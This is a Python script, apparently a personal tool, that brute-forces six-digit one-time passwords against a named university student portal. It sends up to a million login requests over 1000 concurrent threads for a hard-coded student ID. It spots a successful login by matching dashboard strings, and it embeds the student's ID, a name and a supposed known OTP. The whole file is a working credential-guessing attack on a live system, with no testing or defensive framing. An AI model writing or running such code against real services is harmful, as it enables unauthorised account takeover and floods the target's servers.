import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time
import sys

class OTPBruteForcer:
    def __init__(self, max_workers=1000):
        self.found = False
        self.correct_otp = None
        self.attempts = 0
        self.lock = threading.Lock()
        self.max_workers = max_workers
        self.start_time = time.time()
        
    def try_otp(self, otp):
        if self.found:
            return None
            
        otp_str = str(otp).zfill(6)
        system_id = "2024506431"
        url = 'https://student.sharda.ac.in/admin'
        
        try:
            with requests.Session() as session:
                response = session.post(url, auth=(system_id, otp_str), timeout=5)
                
                # DEBUG: Print response for known correct OTP
                if otp_str == "307079":
                    print(f"\n🔍 DEBUG for OTP 307079:")
                    print(f"   Status Code: {response.status_code}")
                    print(f"   Response Length: {len(response.text)}")
                    print(f"   Contains 'studentssdashboard': {'studentssdashboard' in response.text}")
                    print(f"   Contains 'Welcome': {'Welcome' in response.text}")
                    print(f"   Contains 'Aditya': {'Aditya' in response.text}")
                    print(f"   Contains 'dashboard': {'dashboard' in response.text}")
                    print(f"   URL: {response.url}")
                
                # BETTER SUCCESS DETECTION
                success_indicators = [
                    "studentssdashboard",  # Main dashboard container
                    "Welcome To Sharda E-Zone",  # Welcome message
                    "Aditya Dev",  # Your name
                    "ultimetelbe1",  # Quick links
                    "placement-header",  # Header
                    "nav.navdrop",  # Navigation
                    "chartAttendance",  # Attendance chart
                    "todayclass"  # Today's classes
                ]
                
                # Check if ANY success indicator is present
                for indicator in success_indicators:
                    if indicator in response.text:
                        print(f"✅ SUCCESS: Found '{indicator}' in response!")
                        with self.lock:
                            if not self.found:
                                self.found = True
                                self.correct_otp = otp_str
                        return otp_str
                
                # Also check if we're redirected away from login page
                if response.url != url and "login" not in response.url:
                    print(f"✅ SUCCESS: Redirected to {response.url}")
                    with self.lock:
                        if not self.found:
                            self.found = True
                            self.correct_otp = otp_str
                    return otp_str
                        
        except Exception as e:
            if otp_str == "307079":
                print(f"❌ ERROR for OTP 307079: {e}")
            pass
        
        with self.lock:
            self.attempts += 1
            
        return None

    def brute_force(self, start=0, end=999999):
        print(f"🚀 Starting brute force from {start:06d} to {end:06d}...")
        print(f"🔢 Using {self.max_workers} concurrent workers")
        print("⚡ Will stop immediately when correct OTP is found!")
        print("-" * 50)
        
        total_otps = end - start + 1
        
        # First, let's test the known correct OTP to verify detection works
        print("🔍 Testing known OTP 307079 first...")
        test_result = self.try_otp(307079)
        if test_result:
            print(f"🎉 Verified: OTP 307079 is correct!")
            return
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # Submit all OTPs
            futures = {executor.submit(self.try_otp, otp): otp for otp in range(start, end + 1)}
            
            # Monitor progress
            last_report = time.time()
            
            for future in as_completed(futures):
                result = future.result()
                
                # Check if we found the OTP
                if result is not None:
                    print(f"\n🎉 FOUND VALID OTP: {result}")
                    print("🛑 Stopping all workers...")
                    
                    # Cancel all remaining tasks
                    for f in futures:
                        f.cancel()
                    break
                
                # Progress reporting
                current_time = time.time()
                if current_time - last_report >= 5:  # Report every 5 seconds
                    elapsed = current_time - self.start_time
                    rate = self.attempts / elapsed if elapsed > 0 else 0
                    remaining = total_otps - self.attempts
                    eta = remaining / rate / 60 if rate > 0 else 0
                    
                    print(f"📈 Progress: {self.attempts:,}/{total_otps:,} | "
                          f"Rate: {rate:.1f} OTPs/sec | "
                          f"ETA: {eta:.1f} min")
                    last_report = current_time
                
                # Check if found in another thread
                if self.found:
                    print(f"\n🎉 FOUND VALID OTP: {self.correct_otp}")
                    print("🛑 Stopping all workers...")
                    for f in futures:
                        f.cancel()
                    break

        # Final results
        elapsed = time.time() - self.start_time
        print(f"\n" + "="*50)
        if self.found:
            print(f"✅ SUCCESS! OTP: {self.correct_otp}")
            print(f"📊 Attempts: {self.attempts:,}")
            print(f"⏰ Time: {elapsed:.2f} seconds")
            print(f"⚡ Speed: {self.attempts/elapsed:.1f} OTPs/sec")
        else:
            print(f"❌ OTP not found in range {start:06d}-{end:06d}")
            print(f"📊 Total attempts: {self.attempts:,}")

def test_single_otp(otp_to_test=307079):
    """Test a single OTP with detailed debugging"""
    print(f"\n🔍 TESTING SINGLE OTP: {otp_to_test:06d}")
    print("=" * 50)
    
    otp_str = str(otp_to_test).zfill(6)
    system_id = "2024506431"
    url = 'https://student.sharda.ac.in/admin'
    
    try:
        with requests.Session() as session:
            print("Sending POST request with Basic Auth...")
            response = session.post(url, auth=(system_id, otp_str), timeout=10)
            
            print(f"✅ Request successful!")
            print(f"   Status Code: {response.status_code}")
            print(f"   Response URL: {response.url}")
            print(f"   Response Length: {len(response.text)} characters")
            print(f"   Headers: {dict(response.headers)}")
            
            # Check for various indicators
            indicators = {
                "studentssdashboard": "Main dashboard container",
                "Welcome To Sharda E-Zone": "Welcome message", 
                "Aditya Dev": "Your name",
                "ultimetelbe1": "Quick links section",
                "placement-header": "Header section",
                "chartAttendance": "Attendance chart",
                "todayclass": "Today's classes",
                "id=\"otp\"": "Login form (FAILURE)",
                "login": "Login page (FAILURE)",
                "error": "Error message (FAILURE)",
                "invalid": "Invalid message (FAILURE)"
            }
            
            print(f"\n🔍 CONTENT ANALYSIS:")
            for indicator, description in indicators.items():
                found = indicator in response.text
                status = "✅" if found and "FAILURE" not in description else "❌" if found else "➖"
                print(f"   {status} {indicator}: {description}")
            
            # Determine success
            success_found = any(indicator in response.text for indicator in [
                "studentssdashboard", "Welcome To Sharda E-Zone", "Aditya Dev"
            ])
            
            failure_found = any(indicator in response.text for indicator in [
                "id=\"otp\"", "login", "error", "invalid"
            ])
            
            print(f"\n🎯 VERDICT:")
            if success_found:
                print(f"   ✅ SUCCESS: Logged in successfully!")
            elif failure_found:
                print(f"   ❌ FAILURE: Still on login page or error")
            else:
                print(f"   ❓ UNCERTAIN: Can't determine login status")
                
            return success_found
            
    except Exception as e:
        print(f"❌ Request failed: {e}")
        return False

def get_range_from_user():
    """Get OTP range from user"""
    print("🔐 SHARDA UNIVERSITY OTP BRUTE FORCER")
    print("=" * 50)
    
    while True:
        try:
            print("\n📝 SET OTP RANGE (000000 to 999999)")
            start_input = input("   Start OTP [300000]: ").strip()
            end_input = input("   End OTP [400000]: ").strip()
            
            # Set defaults
            start = int(start_input) if start_input else 300000
            end = int(end_input) if end_input else 400000
            
            # Validate
            if start < 0 or start > 999999 or end < 0 or end > 999999 or start > end:
                print("❌ Invalid range. Use 000000-999999")
                continue
            
            total_otps = end - start + 1
            print(f"✅ Range: {start:06d} to {end:06d} ({total_otps:,} OTPs)")
            return start, end
            
        except ValueError:
            print("❌ Please enter valid numbers")

def main():
    """Main program"""
    try:
        print("🔐 SHARDA UNIVERSITY OTP BRUTE FORCER")
        print("=" * 50)
        
        # First, test the known OTP
        print("1. Test known OTP 307079")
        print("2. Brute force range")
        print("3. Quick test small range")
        
        choice = input("\nChoice [1]: ").strip() or "1"
        
        if choice == "1":
            test_single_otp(307079)
        elif choice == "2":
            start, end = get_range_from_user()
            workers = 1000
            bruteforcer = OTPBruteForcer(max_workers=workers)
            bruteforcer.brute_force(start, end)
        elif choice == "3":
            bruteforcer = OTPBruteForcer(max_workers=100)
            bruteforcer.brute_force(307000, 307100)
                
    except KeyboardInterrupt:
        print("\n⏹️ Cancelled by user")
    except Exception as e:
        print(f"\n❌ Error: {e}")

if __name__ == "__main__":
    main()